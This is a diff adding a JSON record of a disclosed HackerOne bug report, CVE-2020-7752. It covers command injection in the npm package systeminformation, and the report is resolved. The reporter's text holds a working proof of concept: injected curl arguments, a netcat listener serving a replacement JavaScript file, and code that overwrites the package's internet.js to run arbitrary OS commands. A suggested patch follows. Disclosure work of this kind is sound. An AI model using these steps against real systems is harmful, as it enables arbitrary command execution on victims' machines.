@@ -1,0 +1,141 @@
+{
+  "id": 925324,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjUzMjQ=",
+  "url": "https://hackerone.com/reports/925324",
+  "title": "[systeminformation] Command Injection via insecure command formatting",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-16T14:34:16.895Z",
+  "submitted_at": "2020-07-16T14:34:16.895Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "effectrenan",
+    "url": "/effectrenan",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/o7xf1nwypf19ey54itvs8mxc1lbe/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-16T16:42:51.827Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-11-16T16:42:51.779Z",
+  "team_member_agreed_on_going_public_at": "2020-11-15T18:14:03.313Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a Command Injection vulnerability in the `systeminformation` package. It allows an attacker to inject arbitrary OS commands.\n\n# Module\n**Module name:** systeminformation\n**Version:** 4.26.10\n**npm page:** `https://www.npmjs.com/package/systeminformation`\n\n## Module Description\n\nSystem and OS information library for node.js.\n\n## Module Stats\n\nWeekly downloads: 363.195\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe attacker can concatenate `curl` parameters to overwrite a Javascript file of the package and then execute any OS commands.\n\nThe `child_process.exec()` function executes the following command:\n```bash\ncurl -I --connect-timeout 5 -m 5 $urlSanitized 2>/dev/null | head -n 1 | cut -d \" \" -f2 # $urlSanitized is the user input\n```\n\n## Steps To Reproduce:\n\nCreate a Javascript file with content:\n```javascript\nconst { exec } = require('child_process')\nfunction inetChecksite(url) {\n  return exec(url)\n}\nexports.inetChecksite = inetChecksite\n```\n\nWe can use Netcat to create a TCP server to send back our Javascript file created before on 443 port:\n```bash\nsudo nc -nlp 443 < file.js\n```\n\nExecute the code bellow to overwrite the Javascript file:\n```javascript\nconst si = require('systeminformation')\nconst HOST = \"127.0.0.1:443\"\n\n//The telnet was chosen to solve an issue with the protocol response check, like HTTP (HTTP/1.0 200 OK in the first line).\nsi.inetChecksite(`telnet://${HOST} --no-buffer -o node_modules/systeminformation/lib/internet.js`)\n\nsetTimeout(() => {\n  process.exit()\n}, 2000)\n```\n\nNow we can execute OS commands:\n```javascript\nconst si = require('systeminformation')\nsi.inetChecksite(\"<Some OS command>\")\n```\n\n## Patch\n\nReplace:\n```javascript\nconst exec = require('child_process').exec\n```\nTo:\n```javascript\nconst { spawn } = require('child_process')\n```\n\n## Supporting Material/References:\n\n- ArchLinux 5.4.50 x64\n- NODEJS 14.5.0\n- NPM 6.14.5\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N]\n\n## Impact\n\nAn attacker can execute arbitrary OS  commands on the victim's machine.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-12-15T18:14:03.408Z",
+  "allow_singular_disclosure_after": -170283780.18462956,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "cachemeifucan",
+    "0xbunty",
+    "5m0ke"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 58814,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "systeminformation",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 25450,
+      "category": "researcher",
+      "content": "**[CVE-2020-7752](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7752).**\n",
+      "updated_at": "2020-11-15T20:38:04.204Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 280291,
+        "username": "effectrenan",
+        "name": "Renan Rocha",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://blog.effectrenan.com",
+        "location": "",
+        "created_at": "2018-05-20T23:45:39.857Z",
+        "url": "https://hackerone.com/effectrenan",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/o7xf1nwypf19ey54itvs8mxc1lbe/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/o7xf1nwypf19ey54itvs8mxc1lbe/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/o7xf1nwypf19ey54itvs8mxc1lbe/fba683f28d17594d98b39d87e2b3aa09acb938c22d49b206f663ae961dc39adc"
+        }
+      }
+    }
+  ]
+}
